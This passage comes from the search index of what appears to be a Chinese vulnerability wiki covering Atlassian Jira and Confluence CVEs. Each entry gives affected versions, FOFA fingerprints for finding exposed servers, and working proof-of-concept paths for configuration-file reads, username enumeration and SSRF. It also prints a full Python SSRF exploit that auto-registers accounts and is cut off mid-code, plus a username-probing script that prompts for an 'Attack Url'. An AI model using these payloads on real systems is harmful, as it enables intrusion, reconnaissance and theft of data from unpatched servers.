","date":"0001-01-01","objectID":"/atlassian-confluence-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2021-26085/:0:0","tags":null,"title":"","uri":"/atlassian-confluence-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2021-26085/"},{"categories":null,"content":"漏洞描述 Confluence 是一个专业的企业知识管理与协同软件，也可以用于构建企业 wiki。使用简单，但它强大的编辑和站点管理特征能够帮助团队成员之间共享信息、文档协作、集体讨论，信息推送。该漏洞不是任意文件读取，只能读取一些 confluence 的配置文件，影响有限。 参考链接： https://jira.atlassian.com/browse/CONFSERVER-67893 ","date":"0001-01-01","objectID":"/atlassian-confluence-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2021-26085/:1:0","tags":null,"title":"","uri":"/atlassian-confluence-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2021-26085/"},{"categories":null,"content":"漏洞影响 version \u003c 7.4.10 7.5.0 ≤ version \u003c 7.12.3 ","date":"0001-01-01","objectID":"/atlassian-confluence-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2021-26085/:2:0","tags":null,"title":"","uri":"/atlassian-confluence-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2021-26085/"},{"categories":null,"content":"网络测绘 app=\"ATLASSIAN-Confluence\" ","date":"0001-01-01","objectID":"/atlassian-confluence-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2021-26085/:3:0","tags":null,"title":"","uri":"/atlassian-confluence-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2021-26085/"},{"categories":null,"content":"漏洞复现 poc： /s/123cfx/_/;/WEB-INF/web.xml /s/123cfx/_/;/WEB-INF/decorators.xml /s/123cfx/_/;/WEB-INF/classes/seraph-config.xml /s/123cfx/_/;/META-INF/maven/com.atlassian.confluence/confluence-webapp/pom.properties /s/123cfx/_/;/META-INF/maven/com.atlassian.confluence/confluence-webapp/pom.xml ","date":"0001-01-01","objectID":"/atlassian-confluence-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2021-26085/:4:0","tags":null,"title":"","uri":"/atlassian-confluence-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2021-26085/"},{"categories":null,"content":"Atlassian Jira cfx 任意文件读取漏洞 CVE-2021-26086 ","date":"0001-01-01","objectID":"/atlassian-jira-cfx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-26086/:0:0","tags":null,"title":"","uri":"/atlassian-jira-cfx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-26086/"},{"categories":null,"content":"漏洞描述 Atlassian Jira Server/Data Center 8.4.0 - Limited Remote File Read/Include ","date":"0001-01-01","objectID":"/atlassian-jira-cfx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-26086/:1:0","tags":null,"title":"","uri":"/atlassian-jira-cfx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-26086/"},{"categories":null,"content":"漏洞影响 Atlassian Jira Server/Data Center 8.4.0 ","date":"0001-01-01","objectID":"/atlassian-jira-cfx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-26086/:2:0","tags":null,"title":"","uri":"/atlassian-jira-cfx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-26086/"},{"categories":null,"content":"网络测绘 app=\"ATLASSIAN-JIRA\" ","date":"0001-01-01","objectID":"/atlassian-jira-cfx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-26086/:3:0","tags":null,"title":"","uri":"/atlassian-jira-cfx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-26086/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /s/cfx/_/;/WEB-INF/web.xml 可读取敏感配置文件 WEB-INF/web.xml WEB-INF/decorators.xml WEB-INF/classes/seraph-config.xml META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.xml META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.properties ","date":"0001-01-01","objectID":"/atlassian-jira-cfx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-26086/:4:0","tags":null,"title":"","uri":"/atlassian-jira-cfx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-26086/"},{"categories":null,"content":"Atlassian Jira com.atlassian.jira 敏感信息泄漏 CVE-2019-8442 ","date":"0001-01-01","objectID":"/atlassian-jira-com.atlassian.jira-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F-cve-2019-8442/:0:0","tags":null,"title":"","uri":"/atlassian-jira-com.atlassian.jira-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F-cve-2019-8442/"},{"categories":null,"content":"漏洞描述 Atlassian Jira是澳大利亚Atlassian公司的一套缺陷跟踪管理系统。该系统主要用于对工作中各类问题、缺陷进行跟踪管理。 远程攻击者可利用该漏洞访问Jira webroot中的文件。 ","date":"0001-01-01","objectID":"/atlassian-jira-com.atlassian.jira-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F-cve-2019-8442/:1:0","tags":null,"title":"","uri":"/atlassian-jira-com.atlassian.jira-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F-cve-2019-8442/"},{"categories":null,"content":"漏洞影响 Atlassian Jira \u003c 7.13.4 Atlassian Jira 8.00-8.0.4 Atlassian Jira 8.1.0-8.1.1 ","date":"0001-01-01","objectID":"/atlassian-jira-com.atlassian.jira-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F-cve-2019-8442/:2:0","tags":null,"title":"","uri":"/atlassian-jira-com.atlassian.jira-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F-cve-2019-8442/"},{"categories":null,"content":"网络测绘 app=\"ATLASSIAN-JIRA\" ","date":"0001-01-01","objectID":"/atlassian-jira-com.atlassian.jira-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F-cve-2019-8442/:3:0","tags":null,"title":"","uri":"/atlassian-jira-com.atlassian.jira-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F-cve-2019-8442/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml ","date":"0001-01-01","objectID":"/atlassian-jira-com.atlassian.jira-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F-cve-2019-8442/:4:0","tags":null,"title":"","uri":"/atlassian-jira-com.atlassian.jira-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F-cve-2019-8442/"},{"categories":null,"content":"Atlassian Jira groupuserpicker 用户信息枚举漏洞 CVE-2019-8449 ","date":"0001-01-01","objectID":"/atlassian-jira-groupuserpicker-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E-cve-2019-8449/:0:0","tags":null,"title":"","uri":"/atlassian-jira-groupuserpicker-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E-cve-2019-8449/"},{"categories":null,"content":"漏洞描述 Atlassian Jira groupuserpicker接口存在用户信息枚举漏洞，攻击者通过漏洞可以获取应用中的使用者账户名称，来进行进一步渗透 ","date":"0001-01-01","objectID":"/atlassian-jira-groupuserpicker-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E-cve-2019-8449/:1:0","tags":null,"title":"","uri":"/atlassian-jira-groupuserpicker-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E-cve-2019-8449/"},{"categories":null,"content":"漏洞影响 Atlassian Jira \u003c8.4.0 ","date":"0001-01-01","objectID":"/atlassian-jira-groupuserpicker-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E-cve-2019-8449/:2:0","tags":null,"title":"","uri":"/atlassian-jira-groupuserpicker-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E-cve-2019-8449/"},{"categories":null,"content":"网络测绘 app=\"ATLASSIAN-JIRA\" ","date":"0001-01-01","objectID":"/atlassian-jira-groupuserpicker-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E-cve-2019-8449/:3:0","tags":null,"title":"","uri":"/atlassian-jira-groupuserpicker-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E-cve-2019-8449/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /rest/api/latest/groupuserpicker?query=admin\u0026maxResults=50\u0026showAvatar=false 当用户存在时 当用户不存在时 ","date":"0001-01-01","objectID":"/atlassian-jira-groupuserpicker-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E-cve-2019-8449/:4:0","tags":null,"title":"","uri":"/atlassian-jira-groupuserpicker-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E-cve-2019-8449/"},{"categories":null,"content":"Atlassian Jira makeRequest SSRF漏洞 CVE-2019-8451 ","date":"0001-01-01","objectID":"/atlassian-jira-makerequest-ssrf%E6%BC%8F%E6%B4%9E-cve-2019-8451/:0:0","tags":null,"title":"","uri":"/atlassian-jira-makerequest-ssrf%E6%BC%8F%E6%B4%9E-cve-2019-8451/"},{"categories":null,"content":"漏洞描述 Jira的 /plugins/servlet/gadgets/makeRequest资源存在SSRF漏洞，原因在于JiraWhitelist这个类的逻辑缺陷，成功利用此漏洞的远程攻击者可以以Jira服务端的身份访问内网资源。经分析，此漏洞无需任何凭据即可触发。 ","date":"0001-01-01","objectID":"/atlassian-jira-makerequest-ssrf%E6%BC%8F%E6%B4%9E-cve-2019-8451/:1:0","tags":null,"title":"","uri":"/atlassian-jira-makerequest-ssrf%E6%BC%8F%E6%B4%9E-cve-2019-8451/"},{"categories":null,"content":"漏洞影响 Atlassian Jira \u003c8.4.0 ","date":"0001-01-01","objectID":"/atlassian-jira-makerequest-ssrf%E6%BC%8F%E6%B4%9E-cve-2019-8451/:2:0","tags":null,"title":"","uri":"/atlassian-jira-makerequest-ssrf%E6%BC%8F%E6%B4%9E-cve-2019-8451/"},{"categories":null,"content":"网络测绘 app=\"ATLASSIAN-JIRA\" ","date":"0001-01-01","objectID":"/atlassian-jira-makerequest-ssrf%E6%BC%8F%E6%B4%9E-cve-2019-8451/:3:0","tags":null,"title":"","uri":"/atlassian-jira-makerequest-ssrf%E6%BC%8F%E6%B4%9E-cve-2019-8451/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /plugins/servlet/gadgets/makeRequest?url=http://目标IP@www.baidu.com/robots.txt ","date":"0001-01-01","objectID":"/atlassian-jira-makerequest-ssrf%E6%BC%8F%E6%B4%9E-cve-2019-8451/:4:0","tags":null,"title":"","uri":"/atlassian-jira-makerequest-ssrf%E6%BC%8F%E6%B4%9E-cve-2019-8451/"},{"categories":null,"content":"Atlassian Jira Mobile Plugin SSRF漏洞 CVE-2022-26135 ","date":"0001-01-01","objectID":"/atlassian-jira-mobile-plugin-ssrf%E6%BC%8F%E6%B4%9E-cve-2022-26135/:0:0","tags":null,"title":"","uri":"/atlassian-jira-mobile-plugin-ssrf%E6%BC%8F%E6%B4%9E-cve-2022-26135/"},{"categories":null,"content":"漏洞描述 6月29日，Atlassian官方发布安全公告，在Atlassian Jira 多款产品中存在服务端请求伪造漏洞(SSRF)，经过身份验证的远程攻击者可通过向Jira Core REST API发送特制请求，从而伪造服务端发起请求，从而导致敏感信息泄露，同时为下一步攻击利用提供条件。需注意的是，若服务端开启注册功能，则未授权用户可通过注册获取权限进而利用。 ","date":"0001-01-01","objectID":"/atlassian-jira-mobile-plugin-ssrf%E6%BC%8F%E6%B4%9E-cve-2022-26135/:1:0","tags":null,"title":"","uri":"/atlassian-jira-mobile-plugin-ssrf%E6%BC%8F%E6%B4%9E-cve-2022-26135/"},{"categories":null,"content":"漏洞影响 Jira Core Server, Jira Software Server, and Jira Software Data Center: Versions after 8.0 and before 8.13.22 8.14.x 8.15.x 8.16.x 8.17.x 8.18.x 8.19.x 8.20.x before 8.20.10 8.21.x 8.22.x before 8.22.4 Jira Service Management Server and Data Center: Versions after 4.0 and before 4.13.22 4.14.x 4.15.x 4.16.x 4.17.x 4.18.x 4.19.x 4.20.x before 4.20.10 4.21.x 4.22.x before 4.22.4 ","date":"0001-01-01","objectID":"/atlassian-jira-mobile-plugin-ssrf%E6%BC%8F%E6%B4%9E-cve-2022-26135/:2:0","tags":null,"title":"","uri":"/atlassian-jira-mobile-plugin-ssrf%E6%BC%8F%E6%B4%9E-cve-2022-26135/"},{"categories":null,"content":"漏洞复现 POST /rest/nativemobile/1.0/batch HTTP/2 Host: issues.example.com Cookie: JSESSIONID=44C6A24A15A1128CE78586A0FA1B1662; seraph.rememberme.cookie=818752%3Acc12c66e2f048b9d50eff8548800262587b3e9b1; atlassian.xsrf.token=AES2-GIY1-7JLS-HNZJ_db57d0893ec4d2e2f81c51c1a8984bde993b7445_lin User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36 Content-Type: application/json Accept: application/json, text/javascript, */*; q=0.01 X-Requested-With: XMLHttpRequest Origin: https://issues.example.com Referer: https://issues.example.com/plugins/servlet/desk Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Content-Length: 63 {\"requests\":[{\"method\":\"GET\",\"location\":\"dnslog@example.com\"}]} ","date":"0001-01-01","objectID":"/atlassian-jira-mobile-plugin-ssrf%E6%BC%8F%E6%B4%9E-cve-2022-26135/:3:0","tags":null,"title":"","uri":"/atlassian-jira-mobile-plugin-ssrf%E6%BC%8F%E6%B4%9E-cve-2022-26135/"},{"categories":null,"content":"漏洞POC https://github.com/assetnote/jira-mobile-ssrf-exploit import requests import string import random import argparse from bs4 import BeautifulSoup as bs4 import urllib3 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) parser = argparse.ArgumentParser() parser.add_argument(\"--target\", help=\"i.e. http://re.local:8090\", required=True) parser.add_argument(\"--ssrf\", help=\"i.e. example.com (no protocol pls)\", required=True) parser.add_argument(\"--mode\", help=\"i.e. manual or automatic - manual mode you need to provide user auth info\", required=True, default=\"automatic\") parser.add_argument(\"--software\", help=\"i.e. jira or jsd - only needed for manual mode\") parser.add_argument(\"--username\", help=\"i.e. admin - only needed for manual jira mode\") parser.add_argument(\"--email\", help=\"i.e. admin@example.com - only needed for manual jira service desk mode\") parser.add_argument(\"--password\", help=\"i.e. testing123 - only needed for manual mode\") args = parser.parse_args() if args.mode == \"manual\": if args.software == \"\": print(\"[*] please pass in a software (jira / jsd)\") if args.software == \"jira\" and args.email == \"\" and args.password == \"\": print(\"[*] must provide an email and password for jira in manual mode\") if args.software == \"jsd\" and args.username == \"\" and args.password == \"\": print(\"[*] must provide an username and password for jira in manual mode\") # atlast - exploit tested on jira \u003c 8.20.3 / jira service desk \u003c 4.20.3-REL-0018 # for full list of affected jira versions please see the following URL # https://confluence.atlassian.com/jira/jira-server-security-advisory-29nd-june-2022-1142430667.html # by shubs banner = \"\"\" _ _ _ __ _| |_| | __ _ ___| |_ / _` | __| |/ _` / __| __| | (_| | |_| | (_| \\__ \\ |_ \\__,_|\\__|_|\\__,_|___/\\__| jira full read ssrf [CVE-2022-26135] brought to you by assetnote [https://assetnote.io] \"\"\" print(banner) proxies = {} # proxy to burp like this - {\"https\":\"http://localhost:8080\"} session = requests.Session() def detect_jira_root(target): root_paths = [\"/\", \"/secure/\" \"/jira/\", \"/issues/\"] jira_found = \"\" for path in root_paths: test_url = \"{}/{}\".format(target, path) r = session.get(test_url, verify=False, proxies=proxies) if \"ajs-base-url\" in r.text: jira_found = path break return jira_found def get_jira_signup(target, base_path): test_url = \"{}{}\".format(target, base_path) r = session.get(test_url, verify=False, proxies=proxies) signup_enabled = False if \"Signup!default.jspa\" in r.text: signup_enabled = True return signup_enabled def signup_user(target, base_path): test_url = \"{}{}secure/Signup!default.jspa\".format(target, base_path) test_url_post = \"{}{}secure/Signup.jspa\".format(target, base_path) r = session.get(test_url, verify=False, proxies=proxies) if 'name=\"captcha\"' in r.text: print(\"[*] url {} has captchas enabled, please complete flow manually and provide user and password as arg\".format(test_url)) return False, {} if \"Mode Breach\" in r.text: print(\"[*] url {} has signups disabled, trying JSD approach\".format(test_url)) return False, {} # captcha not detected, proceed with registration html_bytes = r.text soup = bs4(html_bytes, 'lxml') token = soup.find('input', {'name':'atl_token'})['value'] full_name = ''.join(random.sample((string.ascii_uppercase+string.digits),6)) email = \"{}@example.com\".format(full_name) password = \"9QWP7zyvfa4nJU9QKu*Yt8_QzbP\" paramsPost = {\"password\":password,\"Signup\":\"Sign up\",\"atl_token\":token,\"fullname\":full_name,\"email\":email,\"username\":full_name} headers = {\"Accept\":\"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\",\"User-Agent\":\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36\",\"Connection\":\"close\",\"Pragma\":\"no-cache\",\"DNT\":\"1\",\"Accept-Encoding\":\"gzip, deflate\",\"Cache-Control\":\"no-cache\",\"Upgrade-Insecure-Requests\":\"1\",\"Accept-Language\":\"en-US,en;q=0.9\",\"Content-Type\":\"applicati","date":"0001-01-01","objectID":"/atlassian-jira-mobile-plugin-ssrf%E6%BC%8F%E6%B4%9E-cve-2022-26135/:4:0","tags":null,"title":"","uri":"/atlassian-jira-mobile-plugin-ssrf%E6%BC%8F%E6%B4%9E-cve-2022-26135/"},{"categories":null,"content":"Atlassian Jira Server 及 Data Center 信息泄露漏洞 CVE-2020-14179 ","date":"0001-01-01","objectID":"/atlassian-jira-server-%E5%8F%8A-data-center-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-14179/:0:0","tags":null,"title":"","uri":"/atlassian-jira-server-%E5%8F%8A-data-center-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-14179/"},{"categories":null,"content":"漏洞描述 Atlassian JIRA Server是澳大利亚Atlassian公司的一套缺陷跟踪管理系统的服务器版本。该系统主要用于对工作中各类问题、缺陷进行跟踪管理。Atlassian JIRA Data Center是Atlassian JIRA的数据中心版本。 Atlassian JIRA Server和Data Center 8.5.8之前版本、8.6.0至8.11.1之前版本的/secure/QueryComponent!Default.jspa端点存在信息泄露漏洞。未经身份认证的远程攻击者可利用该漏洞查看自定义字段名称和自定义SLA名称。 ","date":"0001-01-01","objectID":"/atlassian-jira-server-%E5%8F%8A-data-center-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-14179/:1:0","tags":null,"title":"","uri":"/atlassian-jira-server-%E5%8F%8A-data-center-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-14179/"},{"categories":null,"content":"漏洞影响 Atlassian JIRA Server \u003c 8.5.8 Atlassian JIRA Server 8.6.0\u003c= Version \u003c8.11.1 Atlassian JIRA Data Center \u003c 8.5.8 Atlassian JIRA Data Center 8.6.0\u003c= Version \u003c8.11.1 ","date":"0001-01-01","objectID":"/atlassian-jira-server-%E5%8F%8A-data-center-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-14179/:2:0","tags":null,"title":"","uri":"/atlassian-jira-server-%E5%8F%8A-data-center-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-14179/"},{"categories":null,"content":"漏洞复现 poc /secure/QueryComponent!Default.jspa ","date":"0001-01-01","objectID":"/atlassian-jira-server-%E5%8F%8A-data-center-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-14179/:3:0","tags":null,"title":"","uri":"/atlassian-jira-server-%E5%8F%8A-data-center-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-14179/"},{"categories":null,"content":"Atlassian Jira ViewUserHover.jspa 用户信息泄露漏洞 CVE-2020-14181 ","date":"0001-01-01","objectID":"/atlassian-jira-viewuserhover.jspa-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-14181/:0:0","tags":null,"title":"","uri":"/atlassian-jira-viewuserhover.jspa-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-14181/"},{"categories":null,"content":"漏洞描述 Jira存在一个未授权访问漏洞，未授权的用户可以通过一个api接口直接查询到某用户名的存在情况，该接口不同于CVE-2019-8446和CVE-2019-3403的接口，是一个新的接口。如果Jira暴露在公网中，未授权用户就可以直接访问该接口爆破出潜在的用户名。 ","date":"0001-01-01","objectID":"/atlassian-jira-viewuserhover.jspa-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-14181/:1:0","tags":null,"title":"","uri":"/atlassian-jira-viewuserhover.jspa-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-14181/"},{"categories":null,"content":"漏洞影响 Atlassian Jira \u003c 7.13.6 Atlassian Jira 8.0.0 - 8.5.7 Atlassian Jira 8.6.0 - 8.12.0 ","date":"0001-01-01","objectID":"/atlassian-jira-viewuserhover.jspa-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-14181/:2:0","tags":null,"title":"","uri":"/atlassian-jira-viewuserhover.jspa-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-14181/"},{"categories":null,"content":"网络测绘 app=\"Jira\" ","date":"0001-01-01","objectID":"/atlassian-jira-viewuserhover.jspa-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-14181/:3:0","tags":null,"title":"","uri":"/atlassian-jira-viewuserhover.jspa-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-14181/"},{"categories":null,"content":"漏洞复现 打开主界面，注意标识中的 Jira版本是否在影响中 使用POC对用户名是否存在进行验证 /secure/ViewUserHover.jspa?username=admin 用户名如果不存在会返回 存在的用户名会返回 不存在漏洞会返回 ","date":"0001-01-01","objectID":"/atlassian-jira-viewuserhover.jspa-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-14181/:4:0","tags":null,"title":"","uri":"/atlassian-jira-viewuserhover.jspa-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-14181/"},{"categories":null,"content":"漏洞POC POC只用于探测是否存在漏洞 爆破可使用: https://github.com/Rival420/CVE-2020-14181/blob/main/cve-2020-1481.py import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mVersion: Atlassian Jira \u003c 7.13.6 \\033[0m') print('+ \\033[34mVersion: Atlassian Jira 8.0.0 - 8.5.7 \\033[0m') print('+ \\033[34mVersion: Atlassian Jira 8.6.0 - 8.12.0 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/secure/ViewUserHover.jspa?username=peiqipeiqipeiqi\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) version = re.findall(r'\u003cspan id=\"footer-build-information\"\u003e\\((.*?)#', response.text)[0] print(\"\\033[32m[o] 目标 Jira 版本为{} \\033[0m\".format(version)) if \"peiqipeiqipeiqi\" in response.text: print(\"\\033[32m[o] 目标{}存在漏洞 \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] 目标不存在漏洞 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/atlassian-jira-viewuserhover.jspa-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-14181/:5:0","tags":null,"title":"","uri":"/atlassian-jira-viewuserhover.jspa-%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2020-14181/"},{"categories":null,"content":"Atlassian Jira 敏感信息泄露 CVE-2021-26086 ","date":"0001-01-01","objectID":"/atlassian-jira-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2021-26086/:0:0","tags":null,"title":"","uri":"/atlassian-jira-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2021-26086/"},{"categories":null,"content":"漏洞描述 JIRA是Atlassian公司出品的项目与事务跟踪工具，被广泛应用于缺陷跟踪、客户服务、需求收集、流程审批、任务跟踪、项目跟踪和敏捷管理等工作领域。 参考链接： https://jira.atlassian.com/browse/JRASERVER-72695 ","date":"0001-01-01","objectID":"/atlassian-jira-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2021-26086/:1:0","tags":null,"title":"","uri":"/atlassian-jira-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2021-26086/"},{"categories":null,"content":"漏洞影响 version \u003c 8.5.14 8.6.0 ≤ version \u003c 8.13.6 8.14.0 ≤ version \u003c 8.16.1 ","date":"0001-01-01","objectID":"/atlassian-jira-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2021-26086/:2:0","tags":null,"title":"","uri":"/atlassian-jira-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-cve-2021-26086/"},{"categories":null,"content":"网络测绘 app=\"ATLASSIAN-JIRA\" 